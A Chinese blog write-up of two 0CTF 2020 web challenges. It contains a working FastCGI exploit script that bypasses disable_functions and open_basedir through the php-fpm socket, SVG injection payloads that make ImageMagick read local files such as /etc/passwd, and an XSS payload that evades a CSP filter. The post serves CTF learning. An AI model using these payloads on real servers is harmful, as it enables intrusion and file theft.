---
title: TCTF/0CTF 2020 Writeup
date: 2020-06-29 19:49:05
tags: [web, 0ctf, writeup]
---

又是一年 0CTF, 这次一个人一队单刷一次, 做出了两题 WEB, 可惜只输出了一天, 第二天还要赶 ddl, 还是太蔡了 orz

<!--more-->

## easyphp

直接给了 webshell, 看 phpinfo,  

disable_functions: 
set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl  
open_basedir: /var/www/html  
disable_classes: ReflectionClass  
Server API:	FPM/FastCGI  

看样子是需要 rce, 有 disable_functions 和 open_basedir 的限制, 这里可以看到用的是 fpm 而且 fsockopen 没有限制, 可以想到直接打 fcgi, 不过需要知道 unix socket 的路径, 这里可以用 DirectoryIterator 来列目录, 不过试了下只能列根目录, 其他地方还是会被 open_basedir 拦, 比较神奇. 不过好在 fuzz 了一下, 是个常见未知, 在 `unix:///var/run/php-fpm.sock`.  
之后就不用多说了, 用 PHP_VALUE 里面的 open_basedir 覆盖掉 php.ini 里的 open_basedir 即可.  

```python
import requests

sess = requests.session()

def execute_php_code(s):
    res = sess.post('http://pwnable.org:19260/?rh=eval($_POST[a]);', data={"a": s})
    return res.text


code = '''
class AA
{
    const VERSION_1            = 1;

    const BEGIN_REQUEST        = 1;
    const ABORT_REQUEST        = 2;
    const END_REQUEST          = 3;
    const PARAMS               = 4;
    const STDIN                = 5;
    const STDOUT               = 6;
    const STDERR               = 7;
    const DATA                 = 8;
    const GET_VALUES           = 9;
    const GET_VALUES_RESULT    = 10;
    const UNKNOWN_TYPE         = 11;
    const MAXTYPE              = self::UNKNOWN_TYPE;

    const RESPONDER            = 1;
    const AUTHORIZER           = 2;
    const FILTER               = 3;

    const REQUEST_COMPLETE     = 0;
    const CANT_MPX_CONN        = 1;
    const OVERLOADED           = 2;
    const UNKNOWN_ROLE         = 3;

    const MAX_CONNS            = 'MAX_CONNS';
    const MAX_REQS             = 'MAX_REQS';
    const MPXS_CONNS           = 'MPXS_CONNS';

    const HEADER_LEN           = 8;

    /**
     * Socket
     * @var Resource
     */
    private $_sock = null;

    /**
     * Host
     * @var String
     */
    private $_host = null;

    /**
     * Port
     * @var Integer
     */
    private $_port = null;

    /**
     * Keep Alive
     * @var Boolean
     */
    private $_keepAlive = false;

    /**
     * Constructor
     *
     * @param String $host Host of the FastCGI application
     * @param Integer $port Port of the FastCGI application
     */
    public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
    {
        $this->_host = $host;
        $this->_port = $port;
    }

    /**
     * Define whether or not the FastCGI application should keep the connection
     * alive at the end of a request
     *
     * @param Boolean $b true if the connection should stay alive, false otherwise
     */
    public function setKeepAlive($b)
    {
        $this->_keepAlive = (boolean)$b;
        if (!$this->_keepAlive && $this->_sock) {
            fclose($this->_sock);
        }
    }

    /**
     * Get the keep alive status
     *
     * @return Boolean true if the connection should stay alive, false otherwise
     */
    public function getKeepAlive()
    {
        return $this->_keepAlive;
    }

    /**
     * Create a connection to the FastCGI application
     */
    private function connect()
    {
        if (!$this->_sock) {
            $this->_sock = fsockopen($this->_host);
            var_dump($this->_sock);
            if (!$this->_sock) {
                throw new Exception('Unable to connect to FastCGI application');
            }
        }
    }

    /**
     * Build a FastCGI packet
     *
     * @param Integer $type Type of the packet
     * @param String $content Content of the packet
     * @param Integer $requestId RequestId
     */
    private function buildPacket($type, $content, $requestId = 1)
    {
        $clen = strlen($content);
        return chr(self::VERSION_1)         /* version */
            . chr($type)                    /* type */
            . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
            . chr($requestId & 0xFF)        /* requestIdB0 */
            . chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
            . chr($clen & 0xFF)             /* contentLengthB0 */
            . chr(0)                        /* paddingLength */
            . chr(0)                        /* reserved */
            . $content;                     /* content */
    }

    /**
     * Build an FastCGI Name value pair
     *
     * @param String $name Name
     * @param String $value Value
     * @return String FastCGI Name value pair
     */
    private function buildNvpair($name, $value)
    {
        $nlen = strlen($name);
        $vlen = strlen($value);
        if ($nlen < 128) {
            /* nameLengthB0 */
            $nvpair = chr($nlen);
        } else {
            /* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
            $nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
        }
        if ($vlen < 128) {
            /* valueLengthB0 */
            $nvpair .= chr($vlen);
        } else {
            /* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
            $nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
        }
        /* nameData & valueData */
        return $nvpair . $name . $value;
    }

    /**
     * Read a set of FastCGI Name value pairs
     *
     * @param String $data Data containing the set of FastCGI NVPair
     * @return array of NVPair
     */
    private function readNvpair($data, $length = null)
    {
        $array = array();

        if ($length === null) {
            $length = strlen($data);
        }

        $p = 0;

        while ($p != $length) {

            $nlen = ord($data{$p++});
            if ($nlen >= 128) {
                $nlen = ($nlen & 0x7F << 24);
                $nlen |= (ord($data{$p++}) << 16);
                $nlen |= (ord($data{$p++}) << 8);
                $nlen |= (ord($data{$p++}));
            }
            $vlen = ord($data{$p++});
            if ($vlen >= 128) {
                $vlen = ($nlen & 0x7F << 24);
                $vlen |= (ord($data{$p++}) << 16);
                $vlen |= (ord($data{$p++}) << 8);
                $vlen |= (ord($data{$p++}));
            }
            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
            $p += ($nlen + $vlen);
        }

        return $array;
    }

    /**
     * Decode a FastCGI Packet
     *
     * @param String $data String containing all the packet
     * @return array
     */
    private function decodePacketHeader($data)
    {
        $ret = array();
        $ret['version']       = ord($data{0});
        $ret['type']          = ord($data{1});
        $ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
        $ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
        $ret['paddingLength'] = ord($data{6});
        $ret['reserved']      = ord($data{7});
        return $ret;
    }

    /**
     * Read a FastCGI Packet
     *
     * @return array
     */
    private function readPacket()
    {
        if ($packet = fread($this->_sock, self::HEADER_LEN)) {
            $resp = $this->decodePacketHeader($packet);
            $resp['content'] = '';
            if ($resp['contentLength']) {
                $len  = $resp['contentLength'];
                while ($len && $buf=fread($this->_sock, $len)) {
                    $len -= strlen($buf);
                    $resp['content'] .= $buf;
                }
            }
            if ($resp['paddingLength']) {
                $buf=fread($this->_sock, $resp['paddingLength']);
            }
            return $resp;
        } else {
            return false;
        }
    }

    /**
     * Get Informations on the FastCGI application
     *
     * @param array $requestedInfo information to retrieve
     * @return array
     */
    public function getValues(array $requestedInfo)
    {
        $this->connect();

        $request = '';
        foreach ($requestedInfo as $info) {
            $request .= $this->buildNvpair($info, '');
        }
        fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));

        $resp = $this->readPacket();
        if ($resp['type'] == self::GET_VALUES_RESULT) {
            return $this->readNvpair($resp['content'], $resp['length']);
        } else {
            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
        }
    }

    public function request(array $params, $stdin)
    {
        $response = '';
        $this->connect();
        
        $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));

        $paramsRequest = '';
        foreach ($params as $key => $value) {
            $paramsRequest .= $this->buildNvpair($key, $value);
        }
        if ($paramsRequest) {
            $request .= $this->buildPacket(self::PARAMS, $paramsRequest);
        }
        $request .= $this->buildPacket(self::PARAMS, '');

        if ($stdin) {
            $request .= $this->buildPacket(self::STDIN, $stdin);
        }
        $request .= $this->buildPacket(self::STDIN, '');

        fwrite($this->_sock, $request);

        do {
            $resp = $this->readPacket();
            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
                $response .= $resp['content'];
            }
        } while ($resp && $resp['type'] != self::END_REQUEST);

        if (!is_array($resp)) {
            throw new Exception('Bad request');
        }
       
        switch (ord($resp['content'][4])) {
            case self::CANT_MPX_CONN:
                throw new Exception('This app cant multiplex [CANT_MPX_CONN]');
                break;
            case self::OVERLOADED:
                throw new Exception('New request rejected; too busy [OVERLOADED]');
                break;
            case self::UNKNOWN_ROLE:
                throw new Exception('Role value not known [UNKNOWN_ROLE]');
                break;
            case self::REQUEST_COMPLETE:
                return $response;
        }
    }
}


$client = new AA("unix:///var/run/php-fpm.sock");
$req = '/var/www/html/index.php';
$uri = $req .'?'.'command=ls';
var_dump($client);


$code = "<?php var_dump(scandir('/'));echo base64_encode(file_get_contents('/flag.h'));\\n?>";
$php_value = "allow_url_include = On\\nopen_basedir = /\\nauto_prepend_file = php://input";

$params = array(       
        'GATEWAY_INTERFACE' => 'FastCGI/1.0',
        'REQUEST_METHOD'    => 'POST',
        'SCRIPT_FILENAME'   => '/var/www/html/index.php',
        'SCRIPT_NAME'       => '/var/www/html/index.php',
        'QUERY_STRING'      => 'command=ls',
        'REQUEST_URI'       => $uri,
        'DOCUMENT_URI'      => $req,
        #'DOCUMENT_ROOT'     => '/',
        'PHP_VALUE'         => $php_value,
        'SERVER_SOFTWARE'   => 'asd',
        'REMOTE_ADDR'       => '127.0.0.1',
        'REMOTE_PORT'       => '9985',
        'SERVER_ADDR'       => '127.0.0.1',
        'SERVER_PORT'       => '80',
        'SERVER_NAME'       => 'localhost',
        'SERVER_PROTOCOL'   => 'HTTP/1.1',
        'CONTENT_LENGTH'    => strlen($code)
);

echo "Call: $uri\\n\\n";
var_dump($client->request($params, $code));
'''

ret = execute_php_code(code)
print(ret)
```

然后可以发现根目录的 `flag.so` 和 `flag.h`, 读取后 strings 一下就能读到 flag. 不过可以看到是与 ffi 有关的, 所以这做法应该是非预期了, 不过之后又上了个 noeasyphp 修了几个非预期解.  
最后试了下用 ffi 拿 flag,  

```php
$ffi = FFI::load("/flag.h");
var_dump($ffi);
var_dump($ffi->flag_fUn3t1on_fFi());
```

也是能读到 flag 的, 不过这方法名和文件名是怎么预期得到呢, 猜测可能需要用 ffi 的功能去直接越界读内存? 感觉预期解更有意思一点.  


## Wechat Generator

大概功能如下: 

1. 前端提交对话到后端, 后端返回生成的 svg 和对应的 id 到前端预览
2. 前端提交 id 到后端, 渲染 svg 到图片

问题出在生成, 有个功能是插入表情, 比如 `[cool]`, 会被替换为  

```xml
<image x="1240" y="-60" height="100" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="http://pwnable.org:5000/static/emoji/cool"/>
```

显然可能存在注入, 我们输入 `[cool"><a></a><a href="]`, 就成功注入了 `<a></a>` 到 svg 里面. 这里可以想到之前空指针的一道题, imagemagick 在对 `text:/` 协议解析时, 会直接读取文件里的内容, 于是我们就能通过这个方式, 注入一个图片, 链接到 `text:/etc/passwd`, 之后就能通过后端渲染得到的图片, 得到文件内容.  

```python
import requests
import base64

sess = requests.session()

d = '''
[{"type":0,"message":"Love you!<a>asd</a>[cool\\"/><image xlink:href=\\"text:/etc/passwd\\" x='-400px' y='400px' height='1500px' width='1500px'/><a href=\\"]"},{"type":1,"message":"Me too!!!"}]
'''

res = sess.post('http://pwnable.org:5000/preview', data={'data': d})
svg = base64.b64decode(res.json()['data'][len('data:image/svg+xml;base64,'):])

with open('1.svg', 'wb') as f:
    f.write(svg)

pid = res.json()['previewid']
res = sess.post('http://pwnable.org:5000/share', data={'previewid': pid})
print(res.text)
```

这里注意, 注入的内容前面一定要跟点东西, 不能直接这样 `["><a></a><a href="]`, 因为 `http://pwnable.org:5000/static/emoji/`, 返回的是 404, 而 `http://pwnable.org:5000/static/emoji/随意的内容` 返回的是微笑. 如果什么都没有, imagemagick 得到 404 的话, 解析会直接中止.  

现在就能读取文件了, 结合后端是 python, 然后一顿测试, 得到应用在 `/app/app.py`, 可惜这里因为 imagemagick 的问题, 能读的源码有限, 调大图片尺寸也只能得到放大的文字, 不能显示更多的文字.  

部分源码:  

![](https://i.loli.net/2020/06/29/Gde8ry9uX3TKjR7.png)  

访问 `http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws`, 然后题目一转 xss... 要求 alert(1).  
因为这里有 csp 限制, 没法直接在 svg 里面用 script alert, 导致这里卡了挺久, 然后发现 imagemagick 生成的文件拓展名是可控的, 也就是第二步, 得到图片的路径是 `http://pwnable.org:5000/image/gzVIsH/png`, 修改最后的 png 到 svg, 就会如蜜传如蜜, 直接输出一张的 svg, 而且 content-type 也会改变. 不过这里后端限制了扩展名长度只能为 3, 否则会直接报错.  
这里查看文档, 发现 imagemagick 是支持输出 htm 的, `http://pwnable.org:5000/image/gzVIsH/htm` 得到的就是 htm, content-type 也变成了 `text/html`. 于是 xss 思路就来了, 看到源码的过滤是直接替换为空, 可以用喜闻乐见的双写绕过.  
然后在 svg 里面把最外面的 svg tag 给闭合了, 插入一个 html tag, 再用 meta 标签跳到我们的站上 alert(1) 即可, 这样就绕过了 csp.  

```python
d = '''
[{"type":0,"message":"Love you!<a>asd</a>[cool\\"/></g></svg><html><metmetaa http-equiv='refresh' content=\\"0;URL='http://site.com/'\\" /></html><a href=\\"]"},{"type":1,"message":"Me too!!!"}]
'''
```

不过感觉可能也是非预期? 因为看源码还有个可控 callback name 的 jsonp 没用上.  

PS. 这里其实可以直接读 /proc/self/environ 来读环境变量, 可惜 imagemagick 碰到 \x00 就停止读取了, 导致只能读取第一个环境变量 PATH, 都不到后面的 flag
